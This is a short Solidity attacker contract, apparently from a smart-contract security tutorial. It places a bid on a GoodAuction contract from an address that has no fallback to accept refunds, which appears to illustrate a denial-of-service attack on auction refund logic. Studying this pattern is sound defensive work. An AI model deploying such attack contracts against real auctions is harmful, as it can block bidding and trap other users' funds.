//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./goodAuction.sol";

contract AttackAuction {
    GoodAuction good;

    constructor(address _good) {
        good = GoodAuction(_good);
    }

    function attack() public payable {
        good.setCurrentAuctionPrice{value: msg.value}();
    }
}